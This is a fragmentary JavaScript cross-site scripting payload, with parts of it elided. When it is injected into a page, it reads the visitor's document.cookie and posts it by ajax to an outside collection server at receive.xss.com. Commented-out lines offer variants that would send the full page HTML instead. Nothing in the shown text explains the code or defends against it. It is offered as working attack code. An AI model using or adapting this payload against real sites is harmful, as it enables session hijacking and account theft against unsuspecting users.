var xss = function() {
    ...
    x.htmlText = document.getElementsByTagName('html')[0].innerHTML;
...
(function() {
    xss.ready(function() {
        var website = "http://receive.xss.com/index.php";
        //var website = "http://localhost/xss.php";

        /*var html = "html="+decodeURIComponent(xss.htmlText);*/
        /*data = JSON.stringify(data);*/
        /*var data = "data=test"*/
        var html = "cookie="+decodeURIComponent(document.cookie);
        xss.ajax(website, html);
    })
